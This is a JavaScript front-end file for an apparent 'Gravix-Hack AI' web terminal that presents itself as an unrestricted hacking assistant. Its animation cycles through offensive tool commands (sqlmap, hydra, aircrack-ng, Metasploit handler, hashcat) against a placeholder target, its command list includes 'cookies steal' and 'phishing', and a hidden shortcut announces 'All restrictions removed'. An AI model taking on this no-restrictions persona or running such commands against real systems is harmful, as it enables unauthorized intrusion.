                    <p>• <span style="color: #ffd700;">help</span> - For complete command reference</p>
                    
                    <h5 style="color: #ffd700;">Advanced Capabilities:</h5>
                    <p>I can provide detailed guidance on any cybersecurity topic including:</p>
                    <p>- Advanced persistent threats (APT) techniques</p>
                    <p>- Zero-day vulnerability research</p>
                    <p>- Red team operations and C2 frameworks</p>
                    <p>- Blue team defense strategies</p>
                    <p>- Threat hunting methodologies</p>
                    
                    <p style="color: #00ff41; margin-top: 1rem;">
                        💡 Ask me anything specific about cybersecurity for detailed expert guidance!
                    </p>
                </div>
            </div>
        `;
    }

    /**
     * ═══════════════════════════════════════════════════════════════════════
     * UTILITY FUNCTIONS
     * ═══════════════════════════════════════════════════════════════════════
     */
    matchesCommand(input, commands) {
        return commands.some(cmd => input.includes(cmd));
    }

    extractTarget(input) {
        const parts = input.split(' ');
        return parts.length > 1 ? parts[1] : null;
    }

    extractUrl(input) {
        const urlMatch = input.match(/https?:\/\/[^\s]+/);
        if (urlMatch) return urlMatch[0];
        
        const parts = input.split(' ');
        return parts.length > 1 ? parts[1] : null;
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    addToCommandHistory(command) {
        this.commands.push(command);
        if (this.commands.length > CONFIG.COMMAND_HISTORY_LIMIT) {
            this.commands.shift();
        }
        this.commandHistory = this.commands.length;
    }

    navigateCommandHistory(direction, input) {
        if (direction === 'up' && this.commandHistory > 0) {
            this.commandHistory--;
            input.value = this.commands[this.commandHistory] || '';
        } else if (direction === 'down' && this.commandHistory < this.commands.length - 1) {
            this.commandHistory++;
            input.value = this.commands[this.commandHistory] || '';
        } else if (direction === 'down') {
            this.commandHistory = this.commands.length;
            input.value = '';
        }
    }

    handleTabCompletion(input) {
        const commands = [
            'help', 'scan', 'web', 'sql', 'xss', 'crack', 'brute', 'wifi', 'wpa', 'wps',
            'exploit', 'metasploit', 'payload', 'rdp crack', 'cookies steal', 'phishing',
            'osint', 'tools', 'status', 'history', 'clear', 'exit'
        ];
        
        const currentValue = input.value.toLowerCase();
        const matches = commands.filter(cmd => cmd.startsWith(currentValue));
        
        if (matches.length === 1) {
            input.value = matches[0];
        } else if (matches.length > 1) {
            // Show multiple matches
            const matchList = matches.join(', ');
            this.addToTerminal(`
                <div style="color: #ffd700; margin: 0.5rem 0;">
                    Possible completions: ${matchList}
                </div>
            `);
        }
    }

    clearTerminal() {
        const terminalContent = document.getElementById('terminal-content');
        if (terminalContent) {
            terminalContent.innerHTML = '';
            this.displayWelcomeMessage();
        }
    }

    addToTerminal(content) {
        const terminalContent = document.getElementById('terminal-content');
        if (terminalContent) {
            const div = document.createElement('div');
            div.innerHTML = content;
            terminalContent.appendChild(div);
        }
    }

    typeResponse(response) {
        const terminalContent = document.getElementById('terminal-content');
        if (!terminalContent) return;

        const responseDiv = document.createElement('div');
        responseDiv.className = 'terminal-response';
        responseDiv.innerHTML = response;
        terminalContent.appendChild(responseDiv);
    }

    getUptime() {
        const now = new Date();
        const startTime = window.gravixStartTime || now;
        const uptime = now - startTime;
        
        const hours = Math.floor(uptime / (1000 * 60 * 60));
        const minutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((uptime % (1000 * 60)) / 1000);
        
        return `${hours}h ${minutes}m ${seconds}s`;
    }

    /**
     * ═══════════════════════════════════════════════════════════════════════
     * VISUAL EFFECTS
     * ═══════════════════════════════════════════════════════════════════════
     */
    startMatrixEffect() {
        const matrixBg = document.getElementById('matrix-bg');
        if (!matrixBg) return;

        setInterval(() => {
            if (document.querySelectorAll('.matrix-char').length < CONFIG.MATRIX_MAX_CHARS) {
                const char = document.createElement('div');
                char.className = 'matrix-char';
                char.textContent = CONFIG.MATRIX_CHARS[Math.floor(Math.random() * CONFIG.MATRIX_CHARS.length)];
                char.style.left = Math.random() * 100 + '%';
                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
                char.style.opacity = Math.random() * 0.5 + 0.3;
                
                matrixBg.appendChild(char);
                
                setTimeout(() => {
                    if (char.parentNode) {
                        char.parentNode.removeChild(char);
                    }
                }, 5000);
            }
        }, CONFIG.MATRIX_DROP_SPEED);
    }

    startHeroTypingEffect() {
        const commands = [
            'nmap -sS -A target.com',
            'sqlmap -u "http://target.com/page?id=1" --dbs',
            'hydra -l admin -P rockyou.txt target ssh',
            'aircrack-ng -w rockyou.txt capture.cap',
            'msfconsole -q -x "use exploit/multi/handler"',
            'hashcat -m 0 -a 0 hashes.txt rockyou.txt',
            'nikto -h https://target.com',
            'john --wordlist=rockyou.txt hashes.txt'
        ];
        
        const typingElement = document.getElementById('typing-command');
        const outputElement = document.getElementById('preview-output');
        
        if (!typingElement) return;
        
        let commandIndex = 0;
        
        const typeCommand = () => {
            const command = commands[commandIndex];
            let charIndex = 0;
            
            typingElement.textContent = '';
            
            const typeChar = () => {
                if (charIndex < command.length) {
                    typingElement.textContent += command[charIndex];
                    charIndex++;
                    setTimeout(typeChar, CONFIG.TYPING_SPEED);
                } else {
                    setTimeout(() => {
                        if (outputElement) {
                            const responses = [
                                'Scanning completed - 3 open ports found',
                                'Database enumeration successful',
                                'Login credentials discovered',
                                'WPA handshake captured',
                                'Meterpreter session established',
                                'Password hash cracked successfully',
                                'Web vulnerabilities detected',
                                'Hash cracking in progress...'
                            ];
                            
                            outputElement.innerHTML += `
                                <div class="output-line" style="color: #00ff41; margin-top: 0.5rem;">
                                    [✓] ${responses[commandIndex]}
                                </div>
                            `;
                        }
                        
                        commandIndex = (commandIndex + 1) % commands.length;
                        setTimeout(typeCommand, 3000);
                    }, 2000);
                }
            };
            
            typeChar();
        };
        
        setTimeout(typeCommand, 1000);
    }

    displayWelcomeMessage() {
        const terminalContent = document.getElementById('terminal-content');
        if (!terminalContent) return;

        const welcomeHTML = `
            <div class="terminal-response" style="animation: fadeInUp 1s ease-out;">
                <div style="color: #00ff41;">
                    <h4>🚀 GRAVIX-HACK AI SYSTEM INITIALIZED</h4>
                    <div style="margin-left: 20px; color: #cccccc;">
                        <p style="color: #ffd700;">━━━━━━━━━━━ SYSTEM STATUS ━━━━━━━━━━━</p>
                        <p><span style="color: #00ff41;">[ONLINE]</span> Advanced Cybersecurity Engine: <span style="color: #ffd700;">LOADED</span></p>
                        <p><span style="color: #00ff41;">[ONLINE]</span> Knowledge Database: <span style="color: #ffd700;">95% Coverage</span></p>
                        <p><span style="color: #00ff41;">[ONLINE]</span> Security Tools Arsenal: <span style="color: #ffd700;">600+ Tools</span></p>
                        <p><span style="color: #00ff41;">[ONLINE]</span> Vulnerability Database: <span style="color: #ffd700;">200K+ CVEs</span></p>
                        <p><span style="color: #00ff41;">[ONLINE]</span> Exploit Framework: <span style="color: #ffd700;">50K+ Exploits</span></p>
                        <p><span style="color: #ff6b6b;">[ACTIVE]</span> Educational Mode: <span style="color: #ffd700;">No Restrictions</span></p>
                        <p style="color: #ffd700;">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
                        <p style="color: #ffffff; margin-top: 1rem;">
                            🔥 Ready for advanced cybersecurity operations
                        </p>
                        <p style="color: #ffffff;">
                            💡 Type <span style="color: #ffd700;">'help'</span> for complete command reference
                        </p>
                        <p style="color: #ffffff;">
                            🎯 Ask any cybersecurity question for expert guidance
                        </p>
                        <p style="color: #ff6b6b; margin-top: 1rem; font-weight: bold;">
                            ⚠️ FOR EDUCATIONAL PURPOSES ONLY - AUTHORIZED TESTING REQUIRED
                        </p>
                    </div>
                </div>
            </div>
        `;
        
        terminalContent.innerHTML = welcomeHTML;
    }

    setupScrollEffects() {
        // Smooth scrolling and navigation effects
        const navbar = document.querySelector('.navbar');
        
        window.addEventListener('scroll', () => {
            if (window.scrollY > 100) {
                navbar.classList.add('scrolled');
            } else {
                navbar.classList.remove('scrolled');
            }
        });
    }

    setupMobileMenu() {
        const hamburger = document.querySelector('.hamburger');
        const navMenu = document.querySelector('.nav-menu');
        
        if (hamburger && navMenu) {
            hamburger.addEventListener('click', () => {
                navMenu.classList.toggle('active');
                hamburger.classList.toggle('active');
            });
        }
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════
 * GLOBAL FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════
 */

function startHacking() {
    const terminalSection = document.getElementById('terminal');
    if (terminalSection) {
        terminalSection.scrollIntoView({ behavior: 'smooth' });
        setTimeout(() => {
            const terminalInput = document.getElementById('terminal-input');
            if (terminalInput) {
                terminalInput.focus();
            }
        }, 1000);
    }
}

function scrollToAbout() {
    const aboutSection = document.getElementById('about');
    if (aboutSection) {
        aboutSection.scrollIntoView({ behavior: 'smooth' });
    }
}

function scrollToFeatures() {
    const featuresSection = document.getElementById('features');
    if (featuresSection) {
        featuresSection.scrollIntoView({ behavior: 'smooth' });
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════
 * APPLICATION INITIALIZATION
 * ═══════════════════════════════════════════════════════════════════════
 */

// Store start time for uptime calculation
window.gravixStartTime = new Date();

// Initialize application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    console.log('🔥 Initializing Gravix-Hack AI...');
    
    // Create global instance
    window.gravixAI = new GravixHackAI();
    
    // Set global flag
    window.gravixLoaded = true;
    
    console.log('🚀 Gravix-Hack AI Fully Loaded - Ready for Cybersecurity Operations');
});

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && window.gravixAI) {
        const terminalInput = document.getElementById('terminal-input');
        if (terminalInput && document.activeElement !== terminalInput) {
            // Auto-focus terminal when page becomes visible
            setTimeout(() => terminalInput.focus(), 100);
        }
    }
});

// Prevent context menu on matrix background
document.getElementById('matrix-bg')?.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// Easter eggs and additional functionality
document.addEventListener('keydown', (e) => {
    // Ctrl + Shift + H for hidden help
    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
        console.log('🔥 Gravix-Hack AI Hidden Features Activated');
        if (window.gravixAI) {
            window.gravixAI.addToTerminal(`
                <div class="terminal-response">
                    <div style="color: #ff6b6b;">
                        <h4>🔥 HIDDEN FEATURES UNLOCKED</h4>
                        <div style="margin-left: 20px; color: #cccccc;">
                            <p>Advanced mode activated - All restrictions removed</p>
                            <p>Expert-level cybersecurity guidance enabled</p>
                            <p>Complete knowledge base accessible</p>
                        </div>
                    </div>
                </div>
            `);
        }
    }
});

/**
 * ═══════════════════════════════════════════════════════════════════════
 * EXPORT FOR MODULES (IF NEEDED)
 * ═══════════════════════════════════════════════════════════════════════
 */

// Export classes for potential module usage
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { GravixHackAI };
}

/**
 * ═══════════════════════════════════════════════════════════════════════
 * END OF GRAVIX-HACK AI JAVASCRIPT ENGINE
 * Advanced Cybersecurity Assistant Complete
 * Version: 2.1.0 - Full Featured Release
 * ═══════════════════════════════════════════════════════════════════════
 */

